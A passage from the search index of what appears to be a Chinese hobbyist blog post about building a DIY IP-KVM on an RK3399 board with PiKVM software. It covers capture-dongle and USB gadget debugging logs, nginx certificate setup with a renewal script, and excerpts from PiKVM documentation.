ok)\nFormat Video Capture:\n        Width/Height      : 1920/1080\n        Pixel Format      : 'MJPG' (Motion-JPEG)\n        Field             : None\n        Bytes per Line    : 0\n        Size Image        : 3110400\n        Colorspace        : sRGB\n        Transfer Function : Rec. 709\n        YCbCr/HSV Encoding: ITU-R 601\n        Quantization      : Default (maps to Full Range)\n        Flags             :\nCrop Capability Video Capture:\n        Bounds      : Left 0, Top 0, Width 1920, Height 1080\n        Default     : Left 0, Top 0, Width 1920, Height 1080\n        Pixel Aspect: 1/1\nSelection Video Capture: crop_default, Left 0, Top 0, Width 1920, Height 1080, Flags:\nSelection Video Capture: crop_bounds, Left 0, Top 0, Width 1920, Height 1080, Flags:\nStreaming Parameters Video Capture:\n        Capabilities     : timeperframe\n        Frames per second: 60.000 (60/1)\n        Read buffers     : 0\n\nCamera Controls\n\n                  auto_exposure 0x009a0901 (menu)   : min=0 max=3 default=0 value=0 (Auto Mode)\n                                0: Auto Mode\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#ms2130","title":"ms2130","text":"<pre><code>\u279c  ~ sudo dmesg --color=always -W\n[264156.578383] usb 2-3: new SuperSpeed USB device number 2 using xhci_hcd\n[264156.614502] usb 2-3: LPM exit latency is zeroed, disabling LPM.\n[264156.639256] usb 2-3: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=31.00\n[264156.641654] usb 2-3: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[264156.644154] usb 2-3: Product: USB3 Video\n[264156.646540] usb 2-3: Manufacturer: MACROSILICON\n[264156.648972] usb 2-3: SerialNumber: 20210623\n[264156.676445] usb 2-3: Found UVC 1.00 device USB3 Video (345f:2130)\n[264156.735960] hid-generic 0003:345F:2130.000F: hiddev0,hidraw0: USB HID v1.10 Device [MACROSILICON USB3 Video] on usb-0000:02:00.0-3/input4\n\nBus 002 Device 002: ID 345f:2130 MACROSILICON USB3 Video\n\n\u279c  ~ v4l2-ctl --list-formats-ext\nioctl: VIDIOC_ENUM_FMT\n        Type: Video Capture\n\n        [0]: 'YUYV' (YUYV 4:2:2)\n                Size: Discrete 3840x2160\n                        Interval: Discrete 0.056s (18.000 fps)\n                Size: Discrete 2560x1600\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2560x1440\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1152\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1080\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1920x2160\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1920x1200\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1920x1080\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1360x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1280x1024\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1280x960\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1280x720\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 1024x768\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 720x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 640x480\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n        [1]: 'MJPG' (Motion-JPEG, compressed)\n                Size: Discrete 3840x2160\n                        Interval: Discrete 0.056s (18.000 fps)\n                Size: Discrete 2560x1600\n                Size: Discrete 2560x1440\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1152\n                        Interval: Discrete 0.017s (60.000 fps)\n                        Interval: Discrete 0.020s (50.000 fps)\n                        Interval: Discrete 0.033s (30.000 fps)\n                        Interval: Discrete 0.050s (20.000 fps)\n                        Interval: Discrete 0.100s (10.000 fps)\n                Size: Discrete 2048x1080\n                Size: Discrete 1920x2160\n                Size: Discrete 1920x1200\n                Size: Discrete 1920x1080\n                Size: Discrete 1360x768\n                Size: Discrete 1280x1024\n                Size: Discrete 1280x960\n</code></pre> <p>\u51fa\u95ee\u9898</p> <pre><code>\u279c  ~ sudo dmesg --color=always --ctime -W\n[Tue Jul 25 16:47:39 2023] usb 1-3: new high-speed USB device number 29 using xhci_hcd\n[Tue Jul 25 16:47:39 2023] usb 1-3: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=21.00\n[Tue Jul 25 16:47:39 2023] usb 1-3: New USB device strings: Mfr=1, Product=5, SerialNumber=7\n[Tue Jul 25 16:47:39 2023] usb 1-3: Product: USB2 Video\n[Tue Jul 25 16:47:39 2023] usb 1-3: Manufacturer: MACROSILICON\n[Tue Jul 25 16:47:39 2023] usb 1-3: SerialNumber: 20210621\n[Tue Jul 25 16:47:39 2023] usb 1-3: Found UVC 1.00 device USB2 Video (345f:2130)\n[Tue Jul 25 16:47:39 2023] hid-generic 0003:345F:2130.0012: hiddev0,hidraw0: USB HID v1.10 Device [MACROSILICON USB2 Video] on usb-0000:02:00.0-3/input4\n[Tue Jul 25 16:47:39 2023] usb 1-3: USB disconnect, device number 29\n[Tue Jul 25 16:47:49 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:47:53 2023] usb 1-3: new high-speed USB device number 31 using xhci_hcd\n[Tue Jul 25 16:47:53 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:47:57 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:01 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:05 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:09 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 16:48:20 2023] usb 1-3: new high-speed USB device number 32 using xhci_hcd\n[Tue Jul 25 16:48:21 2023] usb 1-3: New USB device found, idVendor=345f, idProduct=2130, bcdDevice=21.00\n[Tue Jul 25 16:48:21 2023] usb 1-3: New USB device strings: Mfr=1, Product=5, SerialNumber=7\n[Tue Jul 25 16:48:21 2023] usb 1-3: Product: USB2 Video\n[Tue Jul 25 16:48:21 2023] usb 1-3: Manufacturer: MACROSILICON\n[Tue Jul 25 16:48:21 2023] usb 1-3: SerialNumber: 20210621\n[Tue Jul 25 16:48:21 2023] usb 1-3: Found UVC 1.00 device USB2 Video (345f:2130)\n[Tue Jul 25 16:48:21 2023] hid-generic 0003:345F:2130.0013: hiddev0,hidraw0: USB HID v1.10 Device [MACROSILICON USB2 Video] on usb-0000:02:00.0-3/input4\n[Tue Jul 25 16:50:24 2023] usb 1-3: USB disconnect, device number 32\n[Tue Jul 25 16:50:44 2023] usb usb2-port3: Cannot enable. Maybe the USB cable is bad?\n</code></pre> <ul> <li>ms2109 \u5728 windows \u4e0b\u80fd\u6b63\u5e38\u5de5\u4f5c<ul> <li>\u5728 linux \u4e0b\uff0custream \u62a5</li> </ul> </li> </ul> <pre><code>-- INFO  [268879.670    stream] -- Device fd=8 opened\n-- INFO  [268879.670    stream] -- Using input channel: 0\n-- INFO  [268879.685    stream] -- Using resolution: 640x480\n-- ERROR [268879.685    stream] -- Could not obtain the requested pixelformat=YUYV; driver gave us MJPEG\n-- INFO  [268879.685    stream] -- Falling back to pixelformat=MJPEG\n-- INFO  [268879.685    stream] -- Using pixelformat: MJPEG\n-- INFO  [268879.700    stream] -- Using HW FPS: 0 -&gt; 60 (coerced)\n-- ERROR [268879.700    stream] -- Device does not support setting of HW encoding quality parameters\n-- INFO  [268879.700    stream] -- Using IO method: MMAP\n-- INFO  [268879.702    stream] -- Requested 5 device buffers, got 5\n-- INFO  [268879.704    stream] -- Capturing started\n-- INFO  [268879.704    stream] -- Switching to HW encoder: the input is (M)JPEG ...\n-- INFO  [268879.704    stream] -- Using JPEG quality: encoder default\n-- INFO  [268879.704    stream] -- Creating pool JPEG with 1 workers ...\n-- INFO  [268879.704    stream] -- Capturing ...\n-- ERROR [268880.714    stream] -- Mainloop select() error: Inappropriate ioctl for device\n-- INFO  [268880.714    stream] -- Destroying workers pool JPEG ...\n-- INFO  [268880.715    stream] -- Capturing stopped\n-- INFO  [268880.715    stream] -- Device fd=8 closed\n\n[Tue Jul 25 17:04:36 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n</code></pre> <p>ms2130 \u63d2 USB3.0 \u6ca1\u6709\u53cd\u5e94\uff0cUSB2.0\uff0cwindows \u548c linux \u90fd\u80fd\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>\u5f00\u53d1\u677f USB2.0 \u65e0\u53cd\u5e94</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u4f7f\u7528-ustream-\u6d4b\u8bd5\u662f\u5426\u80fd\u591f\u4f7f\u7528","title":"\u4f7f\u7528 ustream \u6d4b\u8bd5\u662f\u5426\u80fd\u591f\u4f7f\u7528","text":"<p>pikvm/ustreamer: \u00b5Streamer - Lightweight and fast MJPEG-HTTP streamer (github.com)</p> <pre><code>./ustreamer --device=/dev/video0 --host=0.0.0.0 --port=8000 -r 1920x1080 --format=MJPEG\n</code></pre> <p>ms2109</p> <pre><code>-- INFO  [266472.324    stream] -- Device fd=8 opened\n-- INFO  [266472.324    stream] -- Using input channel: 0\n-- INFO  [266472.339    stream] -- Using resolution: 1920x1080\n-- INFO  [266472.339    stream] -- Using pixelformat: MJPEG\n-- INFO  [266472.354    stream] -- Using HW FPS: 0 -&gt; 60 (coerced)\n-- ERROR [266472.354    stream] -- Device does not support setting of HW encoding quality parameters\n-- INFO  [266472.354    stream] -- Using IO method: MMAP\n-- INFO  [266472.357    stream] -- Requested 5 device buffers, got 5\n-- INFO  [266472.360    stream] -- Capturing started\n-- INFO  [266472.360    stream] -- Switching to HW encoder: the input is (M)JPEG ...\n-- INFO  [266472.360    stream] -- Using JPEG quality: encoder default\n-- INFO  [266472.360    stream] -- Creating pool JPEG with 1 workers ...\n-- INFO  [266472.360    stream] -- Capturing ...\n-- ERROR [266473.375    stream] -- Mainloop select() error: Inappropriate ioctl for device\n-- INFO  [266473.375    stream] -- Destroying workers pool JPEG ...\n-- INFO  [266473.377    stream] -- Capturing stopped\n-- INFO  [266473.379    stream] -- Device fd=8 closed\n</code></pre> <pre><code>[Tue Jul 25 16:24:26 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n[Tue Jul 25 16:24:26 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n[Tue Jul 25 16:24:26 2023] uvcvideo 1-3:1.1: Non-zero status (-71) in video completion handler.\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u952e\u76d8\u95ee\u9898","title":"\u952e\u76d8\u95ee\u9898","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u62a5\u9519\u60c5\u51b5","title":"\u62a5\u9519\u60c5\u51b5","text":"<p>\u63d2\u5165\u4e3b\u677f usb2.0 \u63a5\u53e3\uff0cryzen dmesg\uff0c\u51e0\u79cd\u9519\u8bef\u5982\u4e0b</p> <ul> <li><code>usbhid 1-8:1.1: can't add hid device: -110</code></li> <li><code>usb usb1-port8: Cannot enable. Maybe the USB cable is bad?</code></li> <li><code>usbhid 1-8:1.1: can't add hid device: -71</code></li> </ul> <pre><code># error 1\n\u279c  ~ sudo dmesg --color=always --ctime -W\n[Tue Jul 25 22:01:09 2023] usb 1-8: new high-speed USB device number 126 using xhci_hcd\n[Tue Jul 25 22:01:09 2023] usb 1-8: device descriptor read/64, error -71\n[Tue Jul 25 22:01:10 2023] usb 1-8: New USB device found, idVendor=1d6b, idProduct=0104, bcdDevice= 1.00\n[Tue Jul 25 22:01:10 2023] usb 1-8: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 22:01:10 2023] usb 1-8: Product: Composite KVM Device\n[Tue Jul 25 22:01:10 2023] usb 1-8: Manufacturer: PiKVM\n[Tue Jul 25 22:01:10 2023] usb 1-8: SerialNumber: CAFEBABE\n[Tue Jul 25 22:01:10 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-8/1-8:1.0/0003:1D6B:0104.0104/input/input257\n[Tue Jul 25 22:01:10 2023] hid-generic 0003:1D6B:0104.0104: input,hidraw0: USB HID v1.01 Keyboard [PiKVM Composite KVM Device] on usb-0000:02:00.0-8/input0\n[Tue Jul 25 22:01:56 2023] usbhid 1-8:1.1: can't add hid device: -110\n[Tue Jul 25 22:01:56 2023] usbhid: probe of 1-8:1.1 failed with error -110\n[Tue Jul 25 22:02:42 2023] usbhid 1-8:1.2: can't add hid device: -110\n[Tue Jul 25 22:02:42 2023] usbhid: probe of 1-8:1.2 failed with error -110\n[Tue Jul 25 22:02:42 2023] usb 1-8: USB disconnect, device number 126\n\n\n# error 2\n[Tue Jul 25 22:02:44 2023] usb 1-8: new high-speed USB device number 127 using xhci_hcd\n[Tue Jul 25 22:02:44 2023] usb 1-8: device descriptor read/all, error -71\n[Tue Jul 25 22:02:45 2023] usb usb1-port8: Cannot enable. Maybe the USB cable is bad?\n[Tue Jul 25 22:02:45 2023] usb usb1-port8: attempt power cycle\n[Tue Jul 25 22:02:46 2023] usb 1-8: new high-speed USB device number 6 using xhci_hcd\n[Tue Jul 25 22:02:46 2023] usb 1-8: Device not responding to setup address.\n[Tue Jul 25 22:02:46 2023] usb 1-8: Device not responding to setup address.\n[Tue Jul 25 22:02:46 2023] usb 1-8: device not accepting address 6, error -71\n\n\n# error 3\n[Tue Jul 25 22:02:47 2023] usb 1-8: new high-speed USB device number 7 using xhci_hcd\n[Tue Jul 25 22:02:47 2023] usb 1-8: New USB device found, idVendor=1d6b, idProduct=0104, bcdDevice= 1.00\n[Tue Jul 25 22:02:47 2023] usb 1-8: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 22:02:47 2023] usb 1-8: Product: Composite KVM Device\n[Tue Jul 25 22:02:47 2023] usb 1-8: Manufacturer: PiKVM\n[Tue Jul 25 22:02:47 2023] usb 1-8: SerialNumber: CAFEBABE\n[Tue Jul 25 22:02:47 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:01.2/0000:02:00.0/usb1/1-8/1-8:1.0/0003:1D6B:0104.0105/input/input258\n[Tue Jul 25 22:02:47 2023] hid-generic 0003:1D6B:0104.0105: input,hidraw0: USB HID v1.01 Keyboard [PiKVM Composite KVM Device] on usb-0000:02:00.0-8/input0\n[Tue Jul 25 22:02:47 2023] usbhid 1-8:1.1: can't add hid device: -71\n[Tue Jul 25 22:02:47 2023] usbhid: probe of 1-8:1.1 failed with error -71\n[Tue Jul 25 22:02:47 2023] usbhid f1-8:1.2: can't add hid device: -71\n[Tue Jul 25 22:02:47 2023] usbhid: probe of 1-8:1.2 failed with error -71\n[Tue Jul 25 22:02:47 2023] usb 1-8: USB disconnect, device number 7\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u6b63\u5e38\u7684\u60c5\u51b5","title":"\u6b63\u5e38\u7684\u60c5\u51b5","text":"<p>\u53d1\u73b0 otg \u952e\u76d8\u63a5 windows \u662f\u6ca1\u95ee\u9898\u7684\uff0c\u7136\u540e\u53d1\u73b0 ryzen \u4f7f\u7528 usb 3.0 \u63a5\u53e3\u6ca1\u95ee\u9898 dmesg</p> <pre><code>[Tue Jul 25 22:04:38 2023] usb 3-3.3: reset low-speed USB device number 28 using xhci_hcd\n[Tue Jul 25 22:04:39 2023] usb 3-3.1: reset full-speed USB device number 34 using xhci_hcd\n[Tue Jul 25 22:20:12 2023] usb 3-4: new high-speed USB device number 35 using xhci_hcd\n[Tue Jul 25 22:20:12 2023] usb 3-4: New USB device found, idVendor=1d6b, idProduct=0104, bcdDevice= 1.00\n[Tue Jul 25 22:20:12 2023] usb 3-4: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n[Tue Jul 25 22:20:12 2023] usb 3-4: Product: Composite KVM Device\n[Tue Jul 25 22:20:12 2023] usb 3-4: Manufacturer: PiKVM\n[Tue Jul 25 22:20:12 2023] usb 3-4: SerialNumber: CAFEBABE\n[Tue Jul 25 22:20:12 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-4/3-4:1.0/0003:1D6B:0104.0106/input/input259\n[Tue Jul 25 22:20:12 2023] hid-generic 0003:1D6B:0104.0106: input,hidraw0: USB HID v1.01 Keyboard [PiKVM Composite KVM Device] on usb-0000:0a:00.3-4/input0\n[Tue Jul 25 22:20:12 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-4/3-4:1.1/0003:1D6B:0104.0107/input/input260\n[Tue Jul 25 22:20:12 2023] hid-generic 0003:1D6B:0104.0107: input,hidraw1: USB HID v1.01 Mouse [PiKVM Composite KVM Device] on usb-0000:0a:00.3-4/input1\n[Tue Jul 25 22:20:12 2023] input: PiKVM Composite KVM Device as /devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-4/3-4:1.2/0003:1D6B:0104.0108/input/input261\n[Tue Jul 25 22:20:12 2023] hid-generic 0003:1D6B:0104.0108: input,hidraw2: USB HID v1.01 Mouse [PiKVM Composite KVM Device] on usb-0000:0a:00.3-4/input2\n</code></pre> <p>lsusb \u53ef\u4ee5\u770b\u5230\u65b0\u51fa\u7684\u8bbe\u5907</p> <pre><code>Bus 003 Device 035: ID 1d6b:0104 Linux Foundation Multifunction Composite Gadget\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u7ed9-web-\u6dfb\u52a0\u8bc1\u4e66","title":"\u7ed9 Web \u6dfb\u52a0\u8bc1\u4e66","text":"<p>kvm \u7f51\u7ad9\u4f7f\u7528 nginx\uff0c\u914d\u7f6e\u4f4d\u4e8e<code>/etc/kvmd/nginx/nginx.conf</code>\uff0c\u8bc1\u4e66\u76f8\u5173\u914d\u7f6e\u4f4d\u4e8e <code>/etc/kvmd/nginx/ssl.conf</code></p> <pre><code>http {\n        include /etc/kvmd/nginx/kvmd.ctx-http.conf;\n        include /usr/share/kvmd/extras/*/nginx.ctx-http.conf;\n        server {\n                include /etc/kvmd/nginx/listen-http.conf;\n                include /etc/kvmd/nginx/certbot.ctx-server.conf;\n                include /etc/kvmd/nginx/redirect-to-https.conf;\n        }\n\n        server {\n                include /etc/kvmd/nginx/listen-https.conf;\n                include /etc/kvmd/nginx/ssl.conf;\n                include /etc/kvmd/nginx/kvmd.ctx-server.conf;\n                include /usr/share/kvmd/extras/*/nginx.ctx-server.conf;\n        }\n}\n</code></pre> <pre><code># /etc/kvmd/nginx/ssl.conf\nssl_protocols TLSv1.3 TLSv1.2 TLSv1.1 TLSv1;\nssl_ciphers \"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\";\nssl_certificate /etc/kvmd/nginx/ssl/server.crt;\nssl_certificate_key /etc/kvmd/nginx/ssl/server.key;\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n</code></pre> <p>\u56e0\u6b64\u6211\u5728\u6211\u66f4\u65b0\u8bc1\u4e66\u7684\u673a\u5668\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u5373\u53ef\u3002</p> <pre><code>#!/usr/bin/bash\n\nscp '/root/.acme.sh/*.yfycloud.site_ecc/fullchain.cer' king6:/etc/kvmd/nginx/ssl/server.crt\nscp '/root/.acme.sh/*.yfycloud.site_ecc/*.yfycloud.site.key' king6:/etc/kvmd/nginx/ssl/server.key\nssh king6 'systemctl restart kvmd-nginx'\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#wg-quick-\u65e0\u6cd5\u81ea\u542f\u52a8","title":"wg-quick \u65e0\u6cd5\u81ea\u542f\u52a8","text":"<p>Wireguard - waiting for DNS before trying to start the interface \u00b7 Issue #30459 \u00b7 NixOS/nixpkgs (github.com)</p> <pre><code>Aug 07 23:17:57 king3399 wg-quick[1167]: [#] ip link add wg0 type wireguard\nAug 07 23:17:57 king3399 wg-quick[1167]: [#] wg setconf wg0 /dev/fd/63\nAug 07 23:17:57 king3399 wg-quick[1241]: Name or service not known: `op1.my.to:51820'\nAug 07 23:17:57 king3399 wg-quick[1241]: Configuration parsing error\nAug 07 23:17:57 king3399 wg-quick[1167]: [#] ip link delete dev wg0\nAug 07 23:17:58 king3399 systemd[1]: wg-quick@wg0.service: Main process exited, code=exited, status=1/FAILURE\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#pi-kvm-\u6587\u6863","title":"PI-KVM \u6587\u6863","text":"<p>PiKVM Project (github.com)</p> <ul> <li>ustreamer \u9879\u76ee\u4e5f\u662f\u4ed6\u4eec\u7684</li> <li>kvmd</li> </ul> <p>\u6587\u6863\uff1aPiKVM Handbook</p> <p>DIY: pikvm/pikvm: Open and inexpensive DIY IP-KVM based on Raspberry Pi (github.com)</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#mouse-\u7c7b\u578b-absolute-vs-relative","title":"mouse \u7c7b\u578b (absolute vs relative)","text":"<p>Mouse modes - PiKVM Handbook There are two modes of pointer device: absolute and relative.</p> <p>By default, PiKVM uses absolute positioning mode as the most convenient for the user and software. However, this is not always supported by the BIOS/UEFI. For such cases, support is provided for the relative mode of operation, which can be enabled in the config.</p> <p>Dynamic USB configuration - PiKVM Handbook \u7531\u4e8e bios \u8c8c\u4f3c\u5bf9 absolute \u9f20\u6807\u517c\u5bb9\u6027\u4e0d\u591f\u597d\uff0c\u53ef\u4ee5\u76f4\u63a5\u7981\u7528</p> <p>In rare cases, the host BIOS/UEFI may not understand such a large number of emulated devices on single USB port, so some of them may need to be disabled.</p> <p>The\u00a0<code>kvmd-otgconf</code>\u00a0utility allows you to view and modify the USB configuration on the fly. It requires root permission and can be used for example from a web terminal.</p> <p>\u67e5\u770b\u5f53\u524d otg usb \u914d\u7f6e</p> <pre><code>~/ kvmd-otgconf\n+ hid.usb0  # Keyboard\n+ hid.usb1  # Absolute Mouse\n+ hid.usb2  # Relative Mouse\n</code></pre> <pre><code>kvmd-otgconf --disable-function mass_storage.usb0\nkvmd-otgconf --enable-function mass_storage.usb0\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#faq","title":"FAQ","text":"<p>Can I use PiKVM for gaming?</p> <p>No, because:</p> <ul> <li>For HDMI-CSI bridge, bus bandwidth is not enough to transmit more than 1080p50.</li> <li>For HDMI-USB dongle, high latency and low video quality.</li> <li>General hardware video capture differs from software streaming and introduces additional latency.</li> </ul> <p>Can I use PiKVM with non-Raspberry Pi boards (Orange, Nano, etc)?</p> <p>Yes, but you will have to prepare the operating system yourself. For the PiKVM software, you will need to replace some config files (such as UDEV rules). If you are a developer or an experienced system administrator, you will not have any problems with this. In addition, we are open to patches. If you need help with this, please contact us via\u00a0Discord\u00a0(#unofficial_ports channel).</p> <p>video problem</p> <p>https://docs.pikvm.org/faq/#video-problems</p> <p>CSI bridge vs USB dongle</p> <p>The dongle is completely supported and PiKVM works great with it. But it has some disadvantages compared with recommended\u00a0HDMI-CSI bridge: USB gives a lot of latency (200ms vs 100ms for MJPEG) and it doesn't support stream compression control (you won't be able to use PiKVM in a place with a poor internet connection). There is no H.264 support at the moment. It also cannot automatically detect screen resolution. All this is caused by the hardware limitations of the dongle itself. In addition, some users report hardware problems: the dongle may not work in the BIOS or simply stop working after a while. It's a black box, and no one knows what's inside it. If you have problems with it, it will not be possible to fix them.</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5f00\u673a-diy-\u65b9\u6848","title":"\u5f00\u673a DIY \u65b9\u6848","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#atx-pwr-\u5f15\u811a","title":"ATX PWR 